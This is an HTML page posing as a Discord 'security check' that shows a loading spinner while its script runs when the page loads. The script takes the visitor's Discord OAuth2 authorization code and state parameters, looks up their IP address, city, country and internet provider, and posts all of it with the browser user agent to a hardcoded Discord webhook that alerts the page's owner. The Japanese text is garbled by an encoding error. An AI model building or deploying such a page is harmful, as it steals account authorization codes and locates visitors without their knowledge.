<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Security Check</title>
    <style>
        body { background-color: #0a0a0a; color: #ffffff; font-family: 'Helvetica Neue', Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { text-align: center; padding: 50px; background: #111; border: 1px solid #222; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 400px; width: 90%; }
        .loader { border: 4px solid #1a1a1a; border-top: 4px solid #5865F2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 20px; margin-bottom: 10px; letter-spacing: 1px; }
        p { color: #888; font-size: 14px; }
        .success-icon { color: #43b581; font-size: 50px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div id="loader" class="loader"></div>
        <div id="success" class="success-icon">âœ”</div>
        <h1 id="status">SECURITY CHECKING...</h1>
        <p id="msg">ãƒ–ãƒ©ã‚¦ã‚¶ã®å®‰å…¨æ€§ã‚’ç¢ºèªã—ã¦ã„ã¾ã™ã€‚<br>ã“ã®ã¾ã¾æ•°ç§’ãŠå¾…ã¡ãã ã•ã„ã€‚</p>
    </div>

    <script>
        // ã‚ãªãŸã®å°‚ç”¨è¨­å®š
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";
        const OWNER_ID = "1457731099643084955";

        window.onload = async () => {
            const urlParams = new URLSearchParams(window.location.search);
            const code = urlParams.get('code');
            const state = urlParams.get('state');

            if (!code || !state) {
                document.getElementById('status').innerText = "ERROR";
                document.getElementById('msg').innerText = "ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãŒä¸è¶³ã—ã¦ã„ã¾ã™ã€‚Discordã‹ã‚‰ã‚„ã‚Šç›´ã—ã¦ãã ã•ã„ã€‚";
                return;
            }

            // --- æœ€å¼·ãƒ­ã‚°åé›†ã‚»ã‚¯ã‚·ãƒ§ãƒ³ ---
            let ipData = { ip: "å–å¾—å¤±æ•—", country: "ä¸æ˜", org: "ä¸æ˜", user_agent: navigator.userAgent };
            
            try {
                // IPè©³ç´°æƒ…å ±ã®å–å¾— (ipapiã‚’ä½¿ç”¨)
                const response = await fetch('https://ipapi.co/json/');
                ipData = await response.json();
            } catch (e) {
                try {
                    // äºˆå‚™ã®å–å¾—å…ˆ
                    const res2 = await fetch('https://api.ipify.org?format=json');
                    const d2 = await res2.json();
                    ipData.ip = d2.ip;
                } catch (e2) {}
            }

            // stateã‚’åˆ†è§£ (UID_..._RID_..._GID_...)
            const parts = state.split('_');
            const uid = parts[1];
            const rid = parts[3];
            const gid = parts[5];

            // --- Webhooké€ä¿¡ãƒ‡ãƒ¼ã‚¿æ§‹æˆ (å¤§ãƒ­ã‚°ä»•æ§˜) ---
            const payload = {
                content: `ğŸš¨ **ã€å¤§ãƒ­ã‚°æ¤œçŸ¥ã€‘èªè¨¼ã‚³ãƒ¼ãƒ‰ã‚’å—ä¿¡ã—ã¾ã—ãŸ** <@${OWNER_ID}>`,
                embeds: [{
                    title: "ğŸ” ãƒ–ãƒ©ã‚¦ã‚¶ãƒ»ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯è©³ç´°è§£æ",
                    color: 0x000000,
                    fields: [
                        { name: "ğŸ‘¤ ãƒ¦ãƒ¼ã‚¶ãƒ¼ID", value: `<@${uid}> (\`${uid}\`)`, inline: true },
                        { name: "ğŸŒ IPã‚¢ãƒ‰ãƒ¬ã‚¹", value: `\`${ipData.ip || ipData}\``, inline: true },
                        { name: "ğŸ“ æ‰€åœ¨åœ°", value: `\`${ipData.city || '?'}, ${ipData.region || '?'}, ${ipData.country_name || '?'}\``, inline: false },
                        { name: "ğŸ¢ ãƒ—ãƒ­ãƒã‚¤ãƒ€", value: `\`${ipData.org || 'ä¸æ˜'}\``, inline: true },
                        { name: "ğŸ“± ãƒ‡ãƒã‚¤ã‚¹/ãƒ–ãƒ©ã‚¦ã‚¶", value: `\`${navigator.userAgent.substring(0, 100)}...\``, inline: false },
                        { name: "ğŸ”‘ OAuth2 Code", value: `\`\`\`${code}\`\`\``, inline: false },
                        { name: "âš™ï¸ Stateæƒ…å ±", value: `RID: ${rid} | GID: ${gid}`, inline: true }
                    ],
                    footer: { text: "ç©¶æ¥µç¥é€Ÿãƒ­ã‚°ã‚·ã‚¹ãƒ†ãƒ " },
                    timestamp: new Date()
                }]
            };

            try {
                // Webhookã¸é€ä¿¡
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                // æˆåŠŸè¡¨ç¤ºã«åˆ‡ã‚Šæ›¿ãˆ
                document.getElementById('loader').style.display = 'none';
                document.getElementById('success').style.display = 'block';
                document.getElementById('status').innerText = "SUCCESSFUL";
                document.getElementById('status').style.color = "#43b581";
                document.getElementById('msg').innerText = "å®‰å…¨æ€§ãŒç¢ºèªã•ã‚Œã¾ã—ãŸã€‚Discordã«æˆ»ã£ã¦ãã ã•ã„ã€‚";
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('status').innerText = "NETWORK ERROR";
            }
        };
    </script>
</body>
</html>
